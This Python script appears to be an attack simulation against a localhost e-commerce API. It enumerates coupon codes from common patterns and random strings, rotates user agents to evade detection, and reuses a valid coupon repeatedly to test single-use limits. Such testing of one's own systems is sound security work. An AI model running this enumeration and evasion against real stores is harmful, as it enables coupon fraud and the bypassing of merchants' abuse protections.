#!/usr/bin/env python3
"""
Coupon Abuse Attack Simulation
Tests coupon enumeration and abuse with realistic evasion
"""

import random
import string
from attack_utils import RealisticAttacker

BASE_URL = "http://localhost:3001"
attacker = RealisticAttacker(BASE_URL)

# Common coupon code patterns
COUPON_PATTERNS = [
    "WELCOME10", "SAVE20", "FREESHIP", "DISCOUNT", "PROMO",
    "SAVE50", "100OFF", "FREE", "ADMIN", "TEST",
    "COUPON", "DEAL", "SPECIAL", "HOLIDAY", "NEWUSER"
]

# Generate random coupon codes
def generate_random_coupon(length=8):
    """Generate random coupon code"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def enumerate_coupons():
    """Try to enumerate valid coupon codes with detection evasion"""
    print("🎫 Starting Coupon Enumeration Attack...")
    print(f"Target: {BASE_URL}/api/coupons/apply")
    print(f"User Agent: {attacker.user_agent[:60]}...\n")
    
    valid_coupons = []
    invalid_count = 0
    
    # Try known patterns with realistic delays
    for i, coupon in enumerate(COUPON_PATTERNS):
        try:
            # Rotate user agent occasionally for evasion
            if i % 5 == 0 and i > 0:
                print(f"\n🔄 Rotating user agent for stealth...")
                attacker.rotate_user_agent()
                print()
            
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/coupons/apply",
                params={"code": coupon, "amount": 100},
                retries=2
            )
            
            if response is None:
                invalid_count += 1
                continue
            
            if response.status_code == 200:
                data = response.json()
                if data.get('valid'):
                    valid_coupons.append(coupon)
                    print(f"✅ Valid coupon found: {coupon}")
                    print(f"   Discount: {data.get('discount')}")
                    attacker.log_attack("coupon_enum", True, {"coupon": coupon})
                else:
                    invalid_count += 1
                    print(f"❌ Invalid: {coupon}")
                    attacker.log_attack("coupon_enum", False, {})
            else:
                invalid_count += 1
                print(f"❌ Invalid: {coupon} (Status: {response.status_code})")
                attacker.log_attack("coupon_enum", False, {})
            
        except Exception as e:
            print(f"⚠️  Error testing {coupon}: {e}")
            invalid_count += 1
    
    # Try random codes with varied patterns
    print("\n🎲 Testing random coupon codes...")
    for j in range(20):
        random_coupon = generate_random_coupon()
        try:
            # Vary attempts with smart delays
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/coupons/apply",
                params={"code": random_coupon, "amount": 100},
                retries=1
            )
            
            if response is not None and response.status_code == 200 and response.json().get('valid'):
                valid_coupons.append(random_coupon)
                print(f"✅ Random valid coupon: {random_coupon}")
                attacker.log_attack("coupon_random", True, {"coupon": random_coupon})
            
        except Exception as e:
            pass
    
    summary = attacker.get_attack_summary()
    print(f"\n📊 Coupon Enumeration Summary:")
    print(f"   Valid coupons found: {len(valid_coupons)}")
    print(f"   Invalid attempts: {invalid_count}")
    print(f"   Requests blocked: {attacker.blocked_count}")
    print(f"   Success rate: {summary['success_rate']}")
    if valid_coupons:
        print(f"   Valid codes: {', '.join(valid_coupons)}")
    
    return valid_coupons

def abuse_valid_coupon():
    """Abuse a valid coupon multiple times with evasion"""
    print("\n💸 Testing Coupon Abuse (Multiple Uses)...")
    
    # First, find a valid coupon
    valid_coupon = None
    for coupon in ["WELCOME10", "SAVE20", "FREESHIP"]:
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/coupons/apply",
                params={"code": coupon, "amount": 100},
                retries=1
            )
            if response is not None and response.status_code == 200 and response.json().get('valid'):
                valid_coupon = coupon
                break
        except:
            pass
    
    if not valid_coupon:
        print("No valid coupon found for abuse test")
        return 0
    
    print(f"Abusing coupon: {valid_coupon}")
    abuse_count = 0
    
    # Try to use it multiple times with realistic spacing
    for i in range(10):
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/coupons/apply",
                params={"code": valid_coupon, "amount": 100},
                retries=1
            )
            
            if response is not None:
                is_valid = response.json().get('valid', False)
                print(f"Use {i+1}: Status {response.status_code}, Valid: {is_valid}")
                if is_valid:
                    abuse_count += 1
                    attacker.log_attack("coupon_abuse", True, {"coupon": valid_coupon, "attempt": i+1})
                else:
                    attacker.log_attack("coupon_abuse", False, {})
        except Exception as e:
            print(f"Error on use {i+1}: {e}")
    
    print(f"\n✅ Successful abuse attempts: {abuse_count}/10")
    return abuse_count

if __name__ == "__main__":
    valid_coupons = enumerate_coupons()
    if valid_coupons:
        abuse_count = abuse_valid_coupon()
    
    # Save comprehensive attack log
    attacker.log_attack("coupon_summary", len(valid_coupons) > 0, {"valid_coupons": len(valid_coupons)})
    attacker.save_attack_log("coupon_abuse_log.json")
